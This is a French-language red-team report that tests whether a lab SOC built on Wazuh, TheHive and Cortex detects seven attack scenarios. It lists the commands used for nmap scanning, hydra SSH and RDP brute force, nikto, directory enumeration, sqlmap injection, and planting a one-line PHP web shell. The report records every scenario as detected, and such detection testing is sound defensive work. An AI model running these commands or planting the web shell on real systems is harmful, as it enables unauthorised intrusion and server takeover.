# Tests d'intrusion Black Box — Red Team

## Contexte

- **Attaquant** : Kali Linux — 192.168.137.196 (WAN)
- **Cible** : pfSense WAN — 192.168.137.45 (point d'entrée)
- **Approche** : Black Box — aucune connaissance préalable du réseau interne
- **Objectif** : Valider la capacité de détection du SOC NextGen

---

## Scénario 01 — Reconnaissance réseau

**Outil** : nmap  
**Règle Wazuh** : 100012  

```bash
# Scan de découverte
nmap -sV -A -p- 192.168.137.45

# Scan agressif avec scripts
nmap -sS -sV -O --script=vuln 192.168.137.45
```

**Résultat** : ✅ Détecté — Alerte Telegram reçue

---

## Scénario 02 — Brute Force SSH (Serveur Web)

**Outil** : hydra  
**Règle Wazuh** : 100030  

```bash
hydra -l adminsys -P /usr/share/wordlists/rockyou.txt \
  192.168.137.45 ssh -t 4
```

**Résultat** : ✅ Détecté — 5 tentatives → alerte niveau 12

---

## Scénario 03 — Brute Force RDP (DC01 Active Directory)

**Outil** : hydra  
**Règle Wazuh** : Event ID 4625  

```bash
hydra -l Administrateur -P /usr/share/wordlists/rockyou.txt \
  192.168.137.45 rdp -t 4
```

**Résultat** : ✅ Détecté — Events 4625 corrélés → alerte niveau 12

---

## Scénario 04 — Scan de vulnérabilités web

**Outil** : nikto  
**Règle Wazuh** : 100012  

```bash
nikto -h 192.168.137.45
```

**Résultat** : ✅ Détecté — User-Agent nikto identifié dans logs Apache

---

## Scénario 05 — Énumération de répertoires

**Outil** : gobuster / dirb  
**Règle Wazuh** : 100013  

```bash
gobuster dir -u http://192.168.137.45 \
  -w /usr/share/wordlists/dirb/common.txt

dirb http://192.168.137.45 \
  /usr/share/dirb/wordlists/common.txt
```

**Résultat** : ✅ Détecté — Nombreuses requêtes 404 → alerte

---

## Scénario 06 — Injection SQL

**Outil** : sqlmap  
**Règle Wazuh** : 100010  

```bash
sqlmap -u "http://192.168.137.45/index.php?id=1" \
  --dbs --batch --level=3
```

**Résultat** : ✅ Détecté — Patterns SQL dans logs Apache → alerte

---

## Scénario 07 — Modification fichier web (FIM)

**Outil** : curl / bash  
**Règle Wazuh** : Alerte FIM  

```bash
# Depuis le serveur web (accès SSH simulé)
echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
curl http://192.168.137.45/shell.php?cmd=id
```

**Résultat** : ✅ Détecté — FIM alerte immédiate sur /var/www/html

---

## Résumé des résultats

| # | Scénario | Délai détection | Telegram | TheHive | Cortex |
|---|---|---|---|---|---|
| 01 | Scan ports | < 5s | ✅ | ✅ | ✅ |
| 02 | Brute Force SSH | < 5s | ✅ | ✅ | ✅ |
| 03 | Brute Force RDP | < 5s | ✅ | ✅ | ✅ |
| 04 | Scan web | < 5s | ✅ | ✅ | ✅ |
| 05 | Énumération | < 5s | ✅ | ✅ | ✅ |
| 06 | Injection SQL | < 5s | ✅ | ✅ | ✅ |
| 07 | FIM web | < 3s | ✅ | ✅ | ✅ |

**7 / 7 scénarios détectés avec succès ✅**
